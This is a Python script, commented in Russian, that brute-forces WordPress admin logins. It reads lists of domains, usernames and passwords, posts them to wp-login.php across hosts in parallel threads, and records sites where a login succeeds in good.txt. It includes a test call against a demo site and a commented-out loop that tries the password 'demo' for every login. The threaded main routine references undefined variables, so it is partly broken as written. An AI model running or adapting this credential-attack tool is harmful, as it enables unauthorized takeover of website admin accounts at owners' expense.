# coding=utf-8
import requests
import time
import os
from threading import Thread, current_thread
from queue import Queue

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'DNT': '1'
}

#----login.txt----
file = open('login.txt' , 'r')
l_list = file.readlines()
file.close()
#----password.txt----
file = open('pwd.txt' , 'r')
p_list = file.readlines()
file.close()
#----
#----domains.txt----
file = open('domains.txt' , 'r')
d_list = file.readlines()
file.close()
#----
domain_file = "domains.txt"

#theard_count = 5
def brut(host, login, pwd):
    payload = {
        'log':login,
        'pwd':pwd,
        #'wp-submit': 'Log+In',
        #'rememberme': 'forever',
        'redirect_to': 'https://'+host+'/wp-admin',
        'testcookie': '1'
    }
    url = 'http://'+host+'/wp-login.php'
    s = requests.Session()
    try:    
        s.post(url, data=payload, headers=headers)
    except Exception:
        print('ERROR')
        return False
    response = s.get('http://'+host+'/wp-admin', headers=headers)
    if response.text.find('logout')>0:
        return True
    else:
        return False

res = brut('demo.wpdownloadmanager.com/wpdmpro','demo','demo')
if res:
    print('11')
else:
    print('00')

'''for i in range(len(d_list)):
    url = d_list[i].strip()
    for i in range(len(l_list)):
        login = l_list[i].strip()    
        try:
            if brut(url, login, 'demo'):
                print(url)
                print(login+' demo')
                open('good.txt', 'a+').write(url + '\n')
                print('1')
            else:
                print(url)
                print(login+' demo')
                print('0')
        except Exception:
            print('error')'''
def run(queue, result_queue):
    # Цикл продолжается пока очередь задач не станет пустой
    while not queue.empty():
        # получаем первую задачу из очереди
        host = queue.get_nowait()
        print('{} checking in thread {}'.format(host, current_thread()))
        # проверяем URL
        status = brut(host, login, pwd)
        # сохраняем результат для дальнейшей обработки
        result_queue.put_nowait((status, host))
        # сообщаем о выполнении полученной задачи
        queue.task_done()
        if status:
            print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
            open('good.txt', 'a+').write(host + '\n')
        else:
            pass
        print('{} finished in thread {}. Result={}'.format(host, current_thread(), status))
    print('{} closing'.format(current_thread()))

# MAIN
def main():
    start_time = time.time()

    # Для получения задач и выдачи результата используем очереди
    queue = Queue()
    result_queue = Queue()

    #fr_success = os.path.join(domain_temp, "good.txt")
    #fr_errors  = os.path.join(domain_temp, "error.txt")

    # Сначала загружаем все URL из файла в очередь задач
    with open(domain_file) as f:
        for line in f:
            queue.put(line.strip())

    # Затем запускаем необходимое количество потоков
    for i in range(theard_count):
        thread = Thread(target=run, args=(queue, result_queue))
        thread.daemon = True
        thread.start()

    # И ждем, когда задачи будут выполнены    
    queue.join()

    print(time.time() - start_time)

if __name__ == '__main__':
    main()
